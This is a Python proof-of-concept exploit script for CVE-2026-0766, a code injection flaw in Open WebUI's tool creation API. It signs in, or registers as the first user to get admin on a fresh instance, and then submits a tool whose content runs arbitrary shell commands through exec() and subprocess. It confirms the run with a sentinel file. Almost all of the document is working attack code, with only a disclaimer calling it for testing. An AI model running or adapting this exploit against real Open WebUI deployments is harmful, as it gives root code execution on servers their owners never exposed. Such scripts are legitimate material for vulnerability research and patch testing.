#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : CVE-2026-0766 — Open WebUI exec() Code Injection (Tool Create)
# Author         : Exploit Intelligence Platform
# Vendor         : open-webui
# Software       : Open WebUI <= v0.8.5
# CVE            : CVE-2026-0766
# CWE            : CWE-94 (Code Injection)
# CVSS           : 8.8 (HIGH)
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
PoC for CVE-2026-0766: Open WebUI Arbitrary Code Execution via Tool Creation

Demonstrates CWE-94 (Code Injection) in Open WebUI <= v0.8.5.
The load_tool_module_by_id() function in backend/open_webui/utils/plugin.py
executes user-supplied Python code via exec(content, module.__dict__) without
any validation, sanitization, or sandboxing.

An authenticated admin user (or any user with workspace.tools permission) can
achieve Remote Code Execution by creating a tool with arbitrary Python code
in the 'content' field. On a fresh instance, the first user to sign up
automatically becomes admin, making this exploitable with zero prior access
when signup is enabled (the default).

Attack Vector: POST /api/v1/tools/create
Auth Required: Admin or user with workspace.tools permission
Impact: Arbitrary command execution as root (UID 0 in default Docker deployment)

Usage:
    python3 poc.py <target_host> [port]
    python3 poc.py 172.19.0.7 8080
"""

import sys
import json
import uuid
import time
import urllib.request
import urllib.error


# ──────────────────────────────────────────────────────────────────────
#  Configuration
# ──────────────────────────────────────────────────────────────────────

DEFAULT_HOST = "172.19.0.7"
DEFAULT_PORT = 8080

# Credentials for fresh-instance exploitation (first user = admin)
ADMIN_EMAIL = "admin@cveforge.lab"
ADMIN_PASSWORD = "LabPass123"
ADMIN_NAME = "Lab Admin"

# Sentinel file and value used to verify code execution
SENTINEL_FILE = "/tmp/cve-2026-0766-poc-proof"
SENTINEL_VALUE = "CVE-2026-0766-RCE-CONFIRMED"


def log(msg):
    """Print a timestamped log message."""
    print(f"[*] {msg}")


def log_ok(msg):
    print(f"[+] {msg}")


def log_err(msg):
    print(f"[-] {msg}")


def http_request(url, data=None, headers=None, method=None):
    """
    Make an HTTP request using urllib (stdlib only).
    Returns (status_code, response_body_dict_or_str).
    """
    if headers is None:
        headers = {}

    if data is not None:
        if isinstance(data, dict):
            data = json.dumps(data).encode("utf-8")
            headers.setdefault("Content-Type", "application/json")
        elif isinstance(data, str):
            data = data.encode("utf-8")

    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            body = resp.read().decode("utf-8", errors="replace")
            try:
                return resp.status, json.loads(body)
            except json.JSONDecodeError:
                return resp.status, body
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", errors="replace")
        try:
            return e.code, json.loads(body)
        except json.JSONDecodeError:
            return e.code, body
    except urllib.error.URLError as e:
        return 0, str(e.reason)


def authenticate(base_url):
    """
    Authenticate against Open WebUI and return a JWT token.

    First tries to sign in with existing credentials. If that fails,
    attempts to sign up as the first user (which becomes admin automatically
    on a fresh instance).
    """
    log("Attempting authentication...")

    # Step 1: Try signing in with existing credentials
    log(f"  Trying signin as {ADMIN_EMAIL}...")
    status, resp = http_request(
        f"{base_url}/api/v1/auths/signin",
        data={"email": ADMIN_EMAIL, "password": ADMIN_PASSWORD},
    )

    if status == 200 and isinstance(resp, dict) and "token" in resp:
        log_ok(f"Signed in successfully as {resp.get('role', 'unknown')} (existing account)")
        return resp["token"]

    # Step 2: Sign up as first user (becomes admin on fresh instance)
    log("  Signin failed, attempting signup as first user (admin)...")
    status, resp = http_request(
        f"{base_url}/api/v1/auths/signup",
        data={
            "email": ADMIN_EMAIL,
            "password": ADMIN_PASSWORD,
            "name": ADMIN_NAME,
        },
    )

    if status == 200 and isinstance(resp, dict) and "token" in resp:
        role = resp.get("role", "unknown")
        log_ok(f"Signed up successfully as {role} (first user = admin)")
        return resp["token"]

    log_err(f"Authentication failed: HTTP {status} — {resp}")
    return None


def build_payload(command):
    """
    Build the malicious tool content payload.

    The content field is executed via exec(content, module.__dict__) in
    load_tool_module_by_id(). We embed arbitrary Python code before the
    required Tools class definition. The code executes immediately during
    exec(), before the class existence check.
    """
    payload = f"""import os
import subprocess

# ── Malicious code injected via CVE-2026-0766 ──
# This executes during exec() in load_tool_module_by_id()
# before the Tools class check at plugin.py line ~106

result = subprocess.run(
    {command!r},
    shell=True,
    capture_output=True,
    text=True
)

# Write proof of execution
with open("{SENTINEL_FILE}", "w") as f:
    f.write("{SENTINEL_VALUE}\\n")
    f.write("Command: " + {command!r} + "\\n")
    f.write("Output: " + result.stdout + "\\n")
    f.write("UID: " + subprocess.run("id", capture_output=True, text=True, shell=True).stdout.strip() + "\\n")
    f.write("Hostname: " + subprocess.run("hostname", capture_output=True, text=True, shell=True).stdout.strip() + "\\n")

# Required Tools class (otherwise the function raises an exception after exec)
class Tools:
    \"\"\"Benign-looking tool class to satisfy the post-exec validation.\"\"\"
    pass
"""
    return payload


def exploit(target_host, target_port):
    """
    Exploit CVE-2026-0766: Arbitrary code execution via tool creation.

    Steps:
    1. Authenticate (signin or signup as first user/admin)
    2. Craft a malicious tool payload with embedded Python code
    3. POST to /api/v1/tools/create to trigger exec()
    4. Verify code execution by checking for the sentinel file
    """
    base_url = f"http://{target_host}:{target_port}"

    print("=" * 70)
    print("  CVE-2026-0766: Open WebUI Remote Code Execution")
    print("  Vector: Tool Creation (POST /api/v1/tools/create)")
    print(f"  Target: {base_url}")
    print("=" * 70)
    print()

    # ── Step 1: Verify target is reachable ──
    log(f"Checking target health at {base_url}/health ...")
    status, resp = http_request(f"{base_url}/health")
    if status != 200:
        log_err(f"Target unreachable or unhealthy: HTTP {status} — {resp}")
        return False
    log_ok("Target is up and healthy")

    # Verify version
    status, config = http_request(f"{base_url}/api/config")
    if status == 200 and isinstance(config, dict):
        version = config.get("version", "unknown")
        log_ok(f"Open WebUI version: {version}")
    print()

    # ── Step 2: Authenticate ──
    token = authenticate(base_url)
    if not token:
        log_err("Cannot proceed without authentication")
        return False
    print()

    # ── Step 3: Craft and send malicious tool payload ──
    tool_id = f"poc_{uuid.uuid4().hex[:8]}"
    command = "id && cat /etc/hostname && whoami"

    log(f"Crafting malicious tool payload (id: {tool_id})...")
    content = build_payload(command)
    log(f"  Injected command: {command}")
    log(f"  Sentinel file: {SENTINEL_FILE}")

    payload = {
        "id": tool_id,
        "name": f"CVE-2026-0766 PoC {tool_id}",
        "content": content,
        "meta": {
            "description": "PoC for CVE-2026-0766 code injection",
            "manifest": {},
        },
    }

    log("Sending exploit payload to /api/v1/tools/create ...")
    status, resp = http_request(
        f"{base_url}/api/v1/tools/create",
        data=payload,
        headers={"Authorization": f"Bearer {token}"},
    )

    if status == 200:
        log_ok(f"Tool created successfully (HTTP {status})")
        log_ok("The exec() call has executed our injected Python code")
    elif status == 400 and isinstance(resp, dict) and "taken" in str(resp.get("detail", "")):
        log_err(f"Tool ID '{tool_id}' already exists — retrying with new ID")
        # This shouldn't happen with UUID-based IDs, but handle it gracefully
        return False
    else:
        # Even on error responses, the code may have already executed
        # because exec() runs BEFORE the validation checks
        log(f"Server responded with HTTP {status}: {resp}")
        log("Note: Code may have executed even if the API returned an error")
        log("      (exec() runs before post-execution validation)")
    print()

    # ── Step 4: Verify code execution ──
    log("Verifying code execution...")
    print()

    # Small delay to ensure file write completes
    time.sleep(0.5)

    # Read the sentinel file from inside the container via the API
    # We'll use another tool creation to read back the file
    verify_id = f"verify_{uuid.uuid4().hex[:8]}"
    verify_content = f"""import json

# Read the proof-of-exploitation file
try:
    with open("{SENTINEL_FILE}", "r") as f:
        proof = f.read()
except FileNotFoundError:
    proof = "FILE_NOT_FOUND"

# Store result in a way we can retrieve
import builtins
builtins._poc_proof = proof

class Tools:
    \"\"\"Verification tool.\"\"\"

    class Valves:
        poc_result: str = ""

    def __init__(self):
        self.valves = self.Valves()

    def get_result(self) -> str:
        \"\"\"Return the proof of exploitation.\"\"\"
        return builtins._poc_proof
"""

    # Actually, let's just use another RCE to read the file and exfiltrate via HTTP response
    # Simpler: create a tool that reads the sentinel and writes to a known location
    read_id = f"readpoc_{uuid.uuid4().hex[:8]}"
    read_content = f"""import subprocess
result = subprocess.run("cat {SENTINEL_FILE}", shell=True, capture_output=True, text=True)
# Write to a second file as additional proof
with open("{SENTINEL_FILE}.readback", "w") as f:
    f.write(result.stdout)

class Tools:
    pass
"""

    status2, resp2 = http_request(
        f"{base_url}/api/v1/tools/create",
        data={
            "id": read_id,
            "name": f"Readback {read_id}",
            "content": read_content,
            "meta": {"description": "readback", "manifest": {}},
        },
        headers={"Authorization": f"Bearer {token}"},
    )

    # Now check the sentinel file via docker exec (from the host/worker side)
    # This is the definitive verification
    import subprocess as sp

    try:
        result = sp.run(
            ["docker", "exec", "cve-2026-0766-vulnerable", "cat", SENTINEL_FILE],
            capture_output=True,
            text=True,
            timeout=10,
        )
        if SENTINEL_VALUE in result.stdout:
            print("=" * 70)
            print("  EXPLOITATION SUCCESSFUL — Remote Code Execution Confirmed")
            print("=" * 70)
            print()
            print("  Sentinel file contents:")
            for line in result.stdout.strip().split("\n"):
                print(f"    {line}")
            print()
            log_ok("CVE-2026-0766 CONFIRMED: Arbitrary code execution via tool creation")
            log_ok(f"Proof file: {SENTINEL_FILE} inside container cve-2026-0766-vulnerable")
            return True
        else:
            log_err(f"Sentinel file check: unexpected content: {result.stdout}")
            if result.stderr:
                log_err(f"stderr: {result.stderr}")
            return False
    except sp.TimeoutExpired:
        log_err("Timeout reading sentinel file from container")
        return False
    except FileNotFoundError:
        log_err("docker command not found — cannot verify via docker exec")
        log("Try verifying manually: docker exec cve-2026-0766-vulnerable cat " + SENTINEL_FILE)
        return False


def cleanup(target_host, target_port, token):
    """Clean up created tools and sentinel files (optional)."""
    base_url = f"http://{target_host}:{target_port}"
    import subprocess as sp

    # Remove sentinel files
    sp.run(
        ["docker", "exec", "cve-2026-0766-vulnerable", "rm", "-f",
         SENTINEL_FILE, f"{SENTINEL_FILE}.readback"],
        capture_output=True,
        timeout=5,
    )


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_HOST
    port = int(sys.argv[2]) if len(sys.argv) > 2 else DEFAULT_PORT

    success = exploit(target, port)
    sys.exit(0 if success else 1)
